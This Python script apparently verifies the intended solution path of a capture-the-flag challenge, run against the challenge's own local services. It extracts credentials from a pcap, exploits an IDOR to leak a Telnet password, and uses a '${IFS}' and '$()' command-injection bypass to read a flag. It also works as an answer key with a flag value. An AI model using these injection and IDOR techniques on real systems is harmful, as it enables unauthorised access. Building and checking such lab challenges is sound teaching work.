#!/usr/bin/env python3
"""
End-to-end proof for my whole route, run locally (no Docker needed).

It walks the exact chain a player walks:
  STEP 1  read capture.pcap like Wireshark would: find the Basic-auth login whose
          request got an HTTP 200, decode it -> operator credential.
  STEP 2  log into the operator console with that credential, then abuse the
          IDOR (/document/<id>) to read another operator's router config backup
          -> Telnet backdoor (scrambled).
  STEP 3  decode the backdoor, Telnet into the router, and use the ping
          ${IFS}/$() command injection to read the route flag.
Plus the guarantee I care about: the flag is NEVER in the pcap.

Run:  python3 verify_chain.py
"""
import base64
import os
import re
import socket
import sys
import tempfile
import threading
import time

HERE = os.path.dirname(os.path.abspath(__file__))
PCAP = os.path.join(HERE, "step1-packet-capture", "capture.pcap")


def ok(m):  print(f"  \033[32m[+]\033[0m {m}")
def info(m): print(f"\033[1m{m}\033[0m")
def fail(m):
    print(f"  \033[31m[!]\033[0m {m}"); sys.exit(1)


# ---------------------------------------------------------------- STEP 1 ------
def _decode_token(tok):
    import json
    d = json.loads(base64.b64decode(tok))
    return d["u"], d["p"]


def step1_creds_from_pcap():
    info("STEP 1  --  pull the operator credential out of capture.pcap")
    from scapy.all import Raw, TCP, rdpcap
    pkts = rdpcap(PCAP)

    tokens_by_stream = {}   # client sport -> X-Aero-Session token
    status_by_stream = {}   # client sport -> first response status code
    for p in pkts:
        if not p.haslayer(TCP) or not p.haslayer(Raw):
            continue
        payload = bytes(p[Raw].load)
        tcp = p[TCP]
        if tcp.dport == 80:  # client -> server (request)
            m = re.search(rb"X-Aero-Session: (\S+)", payload)
            if m:
                tokens_by_stream[tcp.sport] = m.group(1).decode()
        elif tcp.sport == 80:  # server -> client (response)
            m = re.search(rb"HTTP/1\.1 (\d{3})", payload)
            if m and tcp.dport not in status_by_stream:
                status_by_stream[tcp.dport] = int(m.group(1))

    ok(f"found {len(tokens_by_stream)} X-Aero-Session token(s) in the capture")
    winners = [(s, t) for s, t in tokens_by_stream.items() if status_by_stream.get(s) == 200]
    if not winners:
        fail("no session in the pcap got a 200 response")
    _, token = winners[0]
    user, code = _decode_token(token)
    ok(f"the token that returned HTTP 200 (base64 JSON) decodes to: {user} : {code}")

    # prove the decoy is present and correctly a 401 (a player must not use it)
    decoys = [(s, t) for s, t in tokens_by_stream.items() if status_by_stream.get(s) == 401]
    if decoys:
        du, dc = _decode_token(decoys[0][1])
        ok(f"decoy token (401, must NOT work): {du} : {dc}")

    # the guarantee: no flag anywhere in the capture
    if b"CITS3006" in open(PCAP, "rb").read():
        fail("flag bytes present in the pcap")
    ok("confirmed: the flag is NOT anywhere in the capture")
    return user, code


# ---------------------------------------------------------------- STEP 2 ------
def step2_leak_config(user, code):
    info("\nSTEP 2  --  log in, then IDOR to another operator's config backup")
    sys.path.insert(0, os.path.join(HERE, "step2-operator-console"))
    import app as console
    client = console.app.test_client()

    # the briefing page at "/" hands out the pcap; login is now /login
    brief = client.get("/").get_data(as_text=True)
    if "intercepted-traffic.pcap" in brief:
        ok("briefing page serves the capture + intercept notes")
    r = client.post("/login", data={"operator": user, "code": code}, follow_redirects=False)
    if r.status_code != 302:
        fail(f"login as {user} failed (status {r.status_code})")
    ok(f"logged into the Operations Records Portal as {user}")

    # record IDs = the number's decimal string, hex-encoded (34303232 = "4022")
    enc = lambda n: str(n).encode().hex()

    # decode my own id to learn the scheme, then IDOR to a NEIGHBOUR's record
    # (4023) that I was never shown -- that's where the breadcrumb lives.
    own = client.get(f"/document/{enc(4022)}").get_data(as_text=True)
    if "Telemetry export request" in own:
        ok(f"my own record ({enc(4022)}) decodes to number 4022 (learn the scheme)")
    crumb = client.get(f"/document/{enc(4023)}").get_data(as_text=True)
    if "NETOPS" in crumb.upper() and "m.okonkwo" in crumb:
        ok(f"IDOR to neighbour {enc(4023)} (#4023, not mine): it names the config record")
    m = re.search(r"record\s*#(\d+)", crumb, re.I)
    if not m:
        fail("no target record number in the breadcrumb")
    target = int(m.group(1))
    ok(f"breadcrumb gives NetOps record {target}; hex-encode it -> {enc(target)}")

    # IDOR: encode the target number and fetch it (no ownership check)
    body = client.get(f"/document/{enc(target)}").get_data(as_text=True)
    if "mgmt.telnet.pass_enc" not in body:
        fail("encoded target did not return the config export")
    leaked = body
    ok(f"record {enc(target)} (#{target}) is readable and it's the router config (IDOR)")

    u = re.search(r"mgmt\.telnet\.user\s*=\s*(\S+)", leaked).group(1)
    enc = re.search(r"mgmt\.telnet\.pass_enc\s*=\s*(\S+)", leaked).group(1)
    pw = "".join(chr(b ^ 0x5A) for b in base64.b64decode(enc))
    ok(f"decoded the Telnet backdoor: {u} : {pw}")
    return u, pw


# ---------------------------------------------------------------- STEP 3 ------
def step3_router_flag(user, password):
    info("\nSTEP 3  --  Telnet into the router and inject to read the flag")
    # stand up the telnet server locally with a temp flag + high port
    flagfile = tempfile.NamedTemporaryFile("w", suffix=".flag", delete=False)
    FLAG = "CITS3006{24n4CBiT2K}"
    flagfile.write(FLAG + "\n"); flagfile.close()

    port = 2323
    os.environ["TELNET_PORT"] = str(port)
    os.environ["FLAG_PATH"] = flagfile.name
    sys.path.insert(0, os.path.join(HERE, "step3-warhead-router"))
    import telnet_server as ts
    ts.FLAG_PATH = flagfile.name
    threading.Thread(target=ts.main, daemon=True).start()
    time.sleep(0.6)

    s = socket.socket(); s.settimeout(5); s.connect(("127.0.0.1", port))

    def rd():
        time.sleep(0.3)
        try: return s.recv(8192).decode(errors="replace")
        except Exception: return ""

    rd()
    s.sendall(user.encode() + b"\r\n"); rd()
    s.sendall(password.encode() + b"\r\n")
    if "login successful" not in rd():
        fail("telnet login failed")
    ok("authenticated to the ACC-RTR-01 console")

    # naive injection is blocked...
    s.sendall(b"ping 8.8.8.8; cat /flag\r\n")
    if "illegal character" in rd():
        ok("naive injection (space + ';') is correctly blocked")

    # ...bypass with ${IFS} + $()
    s.sendall(("ping $(cat${IFS}%s)\r\n" % flagfile.name).encode())
    out = rd()
    s.sendall(b"exit\r\n"); s.close()

    m = re.search(r"CITS3006\{[^}]+\}", out)
    if not m:
        fail(f"injection did not return the flag; got: {out!r}")
    ok(f"command injection returned the flag: {m.group(0)}")
    os.unlink(flagfile.name)
    return m.group(0)


def main():
    print("=" * 66)
    print(" ROUTE VERIFICATION  --  pcap -> operator console (IDOR) -> router")
    print("=" * 66)
    user, code = step1_creds_from_pcap()
    tuser, tpass = step2_leak_config(user, code)
    flag = step3_router_flag(tuser, tpass)
    print("\n" + "=" * 66)
    print(f" \033[32mCHAIN COMPLETE\033[0m  route flag = {flag}")
    print("=" * 66)


if __name__ == "__main__":
    main()
